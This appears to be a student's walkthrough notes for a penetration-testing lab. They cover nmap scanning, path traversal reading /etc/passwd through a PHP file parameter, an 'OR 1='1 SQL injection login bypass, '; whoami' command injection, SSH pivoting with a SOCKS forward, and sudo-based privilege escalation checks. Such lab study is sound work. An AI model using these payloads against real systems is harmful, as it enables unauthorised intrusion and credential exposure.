# Start

- ( Your given the pivot ip, you must enumerate from your linops to get access to it)

**Given : 10.50.14.173**

- (from linops)

**nmap (ip) -T5 2>/dev/null**

**nmap -sV --script=http-enum (ip)**

- (will be given a http port and ssh, so you go into the webbrowser and enter ip w/ port)
(in web browser)

ip:port


- (you will perform web exploitation)

**Look at notes for Web Exploitation and Sql**

- (from the http enum, found the pages you should go to w/ ip)

**(there will be a php that looks into files)** 

**Ex: http://ip/getcareers.php?myfile=**

(note: from here after the = you can change dir by "../" and look into other files)

**Ex: http://ip/getcareers.php?myfile=../../../../../etc/passwd** 

**Ex: http://ip/getcareers.php?myfile=../../../../../etc/hosts**

- ( you will try and find the login page and try the 'OR 1='1)

**right-click on login page --> inspect --> find form method="post" action="login.php"**

-( your going to change **post to get** and then login, then view page source)

- (note: another way would be sql login post)

syntax:

http://ip/login.php?**username='OR 1='1&passwd='OR 1='1**

- (enumerate on the other web extensions you were given to get more information)

(note: you can note that if a page has a decode section, you can enter coded sentences to get decoded)

- (you can go do the page after I got past the login and try and see if it a terminal)
(in browser)

**; whoami**

(note: if so you can run a .ssh keygen and try to exploit machine that way **look at WebExploit notes**)

# Moving into exploiting machine 

- (ip you were given, make a MS and enter creds)

**ssh -MS /tmp/pivot user@ip**

(note: from the box try running cmd **bash** to have a better term)

- (from linops)

(make pivot dynamic to enumerate)

**ssh -S /tmp/pivot pivot -O forward -D 9050**

- (from pivot box)

**sudo -l** : see escalated privs

(note: in this case it gave **/var/tmp/exploit_me**, so I went to the dir and executed the exploit_me to see what it does)

- (can do static analysis)

**strings (exe)**

- (the exe executed)

**./exploit_me (stuffgoeshere)**

- (so try entering some things)

ex: **./exploit_me $(whoami)**

- ( you know that it is a script that is a potential exploit on a machine so you will do the linuxexploitation on script)





